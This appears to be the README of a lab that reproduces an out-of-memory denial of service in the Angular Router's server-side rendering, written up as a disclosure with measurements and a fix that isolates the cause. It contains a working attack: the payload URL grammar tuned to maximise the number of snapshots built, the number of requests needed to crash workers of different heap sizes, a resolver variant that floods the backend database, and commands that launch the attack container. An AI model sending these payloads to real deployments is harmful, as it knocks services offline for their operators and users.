# Angular Router zero-segment group replay

Minimal reproduction of an Angular Router out-of-memory failure during
server-side rendering. This file holds the methodology and the numbers behind it.

```text
Candidate: /dashboard/(detail:1//x:/(detail:1//x:/(...)//y:/(...))//y:/(...))   distinct names
Control:   /dashboard/(detail:1//x:/(detail:1//x:/(...)//x:/(...))//x:/(...))   one name
```

Both URLs are 15,349 bytes and declare the same 1,023 parenthesised groups. They
differ only in how many distinct outlet names the siblings of a group carry.
Eight candidate requests exhaust a 128 MiB SSR worker. The control answers and the
worker stays up.

The URL pays for each group once. The Router pays for the group count times the
application's fan-out: **13,288 snapshots from one request**.

This is a different root cause from
[#70932](https://github.com/angular/angular/issues/70932). That one is about the
width of the state copied into each snapshot. This is about how many snapshots
get built, and it carries no query parameters and no matrix parameters.

## Where it comes from

`@angular/router` 22.2.0, `fesm2022/_router-chunk.mjs`:

| site                          | line | what                                                                                      |
| ----------------------------- | ---: | ----------------------------------------------------------------------------------------- |
| `processSegmentGroup()`       | 3076 | a zero-segment group goes to `processChildren()` with the same `config` and `parentRoute` |
| `processChildren()`           | 3097 | `children.push(...outletChildren)` — every replay lands in one sibling array              |
| `processChildren()`           | 3100 | `if (typeof ngDevMode === 'undefined' \|\| ngDevMode) checkOutletNameUniqueness(...)`     |
| `checkOutletNameUniqueness()` | 3277 | throws NG04006 unconditionally; only the message sits behind `ngDevMode`                  |
| `UrlParser.parseParens()`     |  590 | children go into a map keyed by outlet name, so same-named siblings overwrite             |
| `UrlParser.parseChildren()`   |  484 | `depth > 50` bounds nesting, not the number of groups                                     |
| `resolveData()`               | 3332 | `concatMap` over the activated routes                                                     |

```js
if (segmentGroup.segments.length === 0 && segmentGroup.hasChildren()) {
  return this.processChildren(injector, config, segmentGroup, parentRoute);
}
```

The group costs no level and creates no node, but its contents are matched
against the same routes again. Out comes a set of siblings sharing one outlet
name, which Angular already treats as fatal, and that check is compiled out of
production.

## The route configuration

```ts
{
  path: 'dashboard',
  component: Dashboard,
  children: [{ path: ':id', outlet: 'detail', component: DetailPanel }],
}
```

`app/src/app/app.routes.ts` holds that and six variations of what the panel
contains, plus the flat shape from "A second way" below:

| shape       | fan-out | the panel holds                            |
| ----------- | ------: | ------------------------------------------ |
| `dashboard` |       1 | nothing                                    |
| `nested`    |       2 | one aside                                  |
| `nested2`   |       4 | an aside with two widgets                  |
| `nested3`   |      13 | three panels, three widgets each           |
| `master`    |      13 | `nested3` plus a primary sibling route     |
| `guarded`   |      13 | `nested3` plus an async `canActivateChild` |
| `resolved`  |       1 | `dashboard` plus a resolver                |

## Automated test

```bash
./scripts/validate.sh dashboard
```

Each trial recreates the container, checks the worker's command line for the heap
it was supposed to get, and greps the running worker's copy of the bundle for the
markers the requested build must and must not carry. Logs go to `evidence/`.

```bash
./scripts/validate.sh counts     # what recognition builds
./scripts/validate.sh ladder     # what the fan-out is worth
./scripts/validate.sh matrix     # request-line sizes and heaps
./scripts/validate.sh devprod    # development against production
./scripts/validate.sh ablation   # stock against each proof-only edit
./scripts/validate.sh fuzz       # the payload grid
./scripts/validate.sh backend    # what one request does to the service behind it
```

A trial is refused, not reported, when the burst never reached the worker: a 431
on the request line, or requests missing while `/health` answered fast. Both
produced numbers here that read as a worker withstanding load.

## What recognition builds

`ROUTER_PATCH=count` instruments `createSnapshot()` and nothing else. One request
at the 8 KiB payload, 511 groups:

| Arm                                 | Bytes |      Nodes |
| ----------------------------------- | ----: | ---------: |
| `dashboard`, fan-out 1              | 7,161 |      1,024 |
| `nested`, fan-out 2                 | 7,158 |      2,046 |
| `nested2`, fan-out 4                | 7,159 |      4,090 |
| `nested3`, fan-out 13               | 7,159 | **13,288** |
| `master`, fan-out 13 + primary      | 8,691 | **26,574** |
| control, byte-identical             | 7,159 |    **236** |
| no named outlet in the replayed set | 4,092 |      **4** |

```text
nodes = 2 * groups * matched_per_group * fan_out + 2
```

Exact in every row. `createSnapshot()` runs twice per match, so the tree is half
of that.

Seven is not a correct number either — the control's `depth + 1`. A legitimate
URL declares one group and activates one route. The smallest misbehaving case is
`/dashboard/(detail:1//x:/(detail:1))`, which activates one route twice and which
development rejects with NG04006. There is no safe number of nested groups.

The last row is the precondition: with no named outlet in the replayed set,
`parseParens()` unwraps the single primary child and four nodes are built.

## Requests to OOM

```bash
./scripts/validate.sh matrix
```

Lowest concurrency that takes the worker past its heap limit, climbing from 1,
fresh worker per trial, `OOMKilled=false` on every kill:

| Request line | 128 MiB | 256 MiB | 512 MiB |
| -----------: | ------: | ------: | ------: |
|      7,669 B |  **10** |  **20** |  **49** |
|     15,349 B |   **8** |  **11** |  **20** |

The 16 KB payload is the efficient one as the heap grows. At 128 MiB the 8 KB
one costs less total traffic to get there: 77 KB against 123 KB.

An async `canActivateChild` needs 5 requests at 128 MiB instead of 8, and 11 at
256 MiB, which is what the configuration without it needs. The hook lowers the
floor; it is not what makes this fatal.

Counts move by a request or two between runs, here and in the tables below.

More memory does not halve the exposure, and every count here is small enough
that no rate limit tells the burst from ordinary traffic. At 128 MiB the 8 KB
payload costs less total traffic to get there, 77 KB against 123 KB; at 512 MiB
the 16 KB one is 2.5x more efficient. Heaps above 512 MiB were not measured.

The fan-out belongs to the application and costs the attacker nothing: on the
same request, a bare panel builds 2,048 nodes and three panels of three widgets
build 26,600.

## A note on Nginx

The lab ships an Nginx service, but no cell here is measured through it. This
configuration serialises the upstream requests: sixteen concurrent ones finished
7.9 seconds apart, 8067, 15535, 23289 ... 126788 ms, one request's cost each in a
queue. Straight at the worker the same sixteen finish within 4 ms.

Through this configuration the proxy serialises the upstream requests. Sixteen
concurrent requests finished 7.9 seconds apart — 8067, 15535, 23289 … 126788 ms —
one request's cost each, in a queue. Straight at the worker the same sixteen
finish within 4 ms of one another. So proxied cells measure the proxy's queue,
not the Router: the worker never holds more than one snapshot tree.

Add a resolver and that stops. `/live` is `nested3` with one, and through the
same proxy it is fatal at 8. Whether the burst arrives together is a property of
the deployment, not of the Router.

## A second way to the same missing check

The gate at `:3100` is not only reachable through the replay. A flat URL of
distinct outlet names reaches it too, because `processSegmentAgainstRoute()`
(`:3123`) lets an empty-path route in the primary outlet match every named
outlet the URL declares. That inflation is
[#70932](https://github.com/angular/angular/issues/70932)'s, not this one's.

```ts
{ path: '', component: Shell, children: [        // <router-outlet name="side" />
    { path: ':id', component: Report, resources: threeResources },
    { path: '', outlet: 'side', component: Panel },
] }
```

```text
/(a:1//b:1//c:1//...)
```

With `withRouterResources()` enabled, each duplicated instance costs one factory
and its loaders. Three resources on 300 ms timers, `ROUTER_RESOURCES=1`:

| Request line | Outlets |    Heap | Requests | stock      | #70933 applied |
| -----------: | ------: | ------: | -------: | ---------- | -------------- |
|      7,995 B |   1,246 | 256 MiB |        5 | **V8 OOM** | **V8 OOM**     |
|     16,073 B |   2,400 | 256 MiB |        3 | **V8 OOM** | **V8 OOM**     |
|      7,995 B |   1,246 | 512 MiB |       12 | **V8 OOM** | **V8 OOM**     |
|     16,073 B |   2,400 | 512 MiB |        8 | **V8 OOM** | **V8 OOM**     |

Loaders that resolve immediately kill nothing, so the 300 ms wait is what makes
this cost.

`withRouterResources()` is developer preview and opt-in, so an application that
has not enabled it is outside this.

What matters is that ungating `:3100` does **not** close this one:
`mergeEmptyPathMatches` creates those duplicates one level below where that call
runs, so the check has to run after the merge as well. That was measured
elsewhere, not here: with both call sites these four cells answer 404 and the
worker lives.

## Only in production

`@angular/build` replaces `ngDevMode` with `false` in an optimized build, so
`checkOutletNameUniqueness` is tree-shaken out of the server bundle that ships.

```bash
./scripts/validate.sh devprod
```

Same application, same URL, same heap, four requests:

| Build         | `checkOutletNameUniqueness` |  Status |
| ------------- | --------------------------- | ------: |
| `development` | present                     | **404** |
| `production`  | tree-shaken                 |     302 |

In development the application is protected. Nothing run locally, and no unit
test, shows this.

```bash
$ grep -rl "checkOutletNameUniqueness" app/dist/router-replay-e2e/server/   # no match
$ grep -rl "checkOutletNameUniqueness" app/dist-dev/server/
app/dist-dev/server/main.server.mjs
```

## What the budget buys

```bash
node client/fuzz.mjs            # the grid, offline
./scripts/validate.sh fuzz      # measured
```

Two free choices. A primary sibling, where the application has a primary child
route beside the named one, makes `1//detail:1` match two routes per group for 3
bytes. And `)` already ends a group, so the `//` between sibling wrappers is
optional; the one before the first wrapper is not, since `detail:1x:` reads as
outlet `detail` carrying the segment `1x`.

At a 15,900-byte budget against a fan-out of 13:

| grammar                   | b, d  | groups |  bytes |      nodes |
| ------------------------- | ----- | -----: | -----: | ---------: |
| `detail:1`, separators    | 32, 2 |  1,057 | 15,853 |     27,484 |
| `detail:1`, none          | 34, 2 |  1,191 | 15,553 |     30,968 |
| `1//detail:1`, separators | 29, 2 |    871 | 15,676 |     45,294 |
| `1//detail:1`, none       | 30, 2 |    931 | 14,958 | **48,414** |

The third term is the application's own outlet name, repeated in every group, and
the attacker cannot change it: `a` fits 1,407 groups into the same budget where
`sidePanel` fits 820.

Depth is nearly irrelevant. The optimum is `d=2`, and the parser's `depth > 50`
guard is never in play. What decides is how many groups fit.

## The service behind the worker

`backend/server.mjs` answers after `BACKEND_MS`, 250 by default, and counts
queries. `/resolved` is the four-line configuration with a resolver on it.

```bash
./scripts/validate.sh backend
```

One request, fan-out 1, so every query is one replayed group:

|     Request line | Groups | Queries | Worker slot held | Peak in flight |
| ---------------: | -----: | ------: | ---------------: | -------------: |
|            230 B |     15 |  **15** |         3,924 ms |              1 |
|            950 B |     63 |  **63** |        15,994 ms |              1 |
|          1,910 B |    127 | **127** |        32,069 ms |              1 |
| 1,910 B, control |    127 |   **7** |         1,927 ms |              1 |

Queries equal groups at every size. Peak in flight is 1, which is
`resolveData()`'s `concatMap` measured rather than asserted.

The worker stays healthy and `/health` answers 200 throughout, so the failure
shows up on the database. What reaches it comes from the SSR tier's own address
with its own credentials and carries nothing attacker-controlled, and the client
gets a 302 with a 20-byte `Location`. Nothing correlates the two. Only `resolve`
was measured.

## Isolating it

Proof-only edits to `@angular/router`, applied at image build time. `none` is
stock, and that is what every number above uses.

```bash
ROUTER_PATCH=count       docker compose up -d --build --wait app
ROUTER_PATCH=ungate      docker compose up -d --build --wait app
ROUTER_PATCH=share-query docker compose up -d --build --wait app
```

```bash
./scripts/validate.sh ablation
```

`nested3`, 15,349 bytes, four concurrent requests, 256 MiB:

| Build         |   Peak RSS | Status |
| ------------- | ---------: | -----: |
| stock         |    296 MiB |    302 |
| `share-query` |    273 MiB |    302 |
| `ungate`      | **73 MiB** |    404 |

#70933 does not reach this: it shares one frozen query map across snapshots, and
this attack carries no query parameters. Ungating drops the memory to the
worker's idle footprint, because recognition throws on the first duplicated
sibling and the tree is never built. The check runs after the provisional
snapshots exist, so it bounds what the tree retains, not everything recognition
allocates.

## Manual test

The candidate intentionally takes down the SSR worker. Use only this disposable
local stack.

```bash
HEAP_MB=128 SHAPE=nested3 docker compose up -d --wait app
HEAP_MB=128 SHAPE=nested3 BRANCHES=2 DEPTH=9 CONCURRENCY=8 \
  docker compose --profile test run --rm candidate
docker compose logs app | grep -E 'Reached heap limit|JavaScript heap out of memory'
docker inspect "$(docker compose ps -a -q app)" --format '{{.State.OOMKilled}}'
```

Expected: a V8 heap error and `false`. Swap `candidate` for `control` to send the
byte-identical request with one wrapper name instead of many; it is not harmless,
only much cheaper. `SHAPE` picks the configuration, `BRANCHES` and `DEPTH` size
the URL, `PRIM=1` adds the primary sibling, `NO_SEP=1` drops the separator and
`OUTLET` matches the application's outlet name.

`scripts/lanes.sh` runs whole cells in parallel and `scripts/sweep.sh` runs one
cell's concurrencies, a Compose project and a physical core each. Both take a
lock: one measurement run at a time.

## Where this stops

It needs SSR, a route with a named outlet reachable under a path, and a catch-all
so the request survives the `@angular/ssr` route tree, which splits the path on
`/` and would otherwise 404 first.

The fan-out is the application's choice and the dominant multiplier, so an
application whose named outlet holds nothing is not worth attacking this way.

Recognition finishes. This is not a permanent spin.

## Clean up

```bash
docker compose down -v --remove-orphans
```

## Environment

```text
Node.js:     24.16.0 in the image
Angular:     22.2.0 production AOT (@angular/router and @angular/ssr 22.2.0)
SSR engine:  AngularNodeAppEngine + Express 5.1.0
Docker:      29.7.2, Compose v5.5.0
Host:        Windows 11, Docker Desktop, i7 with 8 physical cores
```
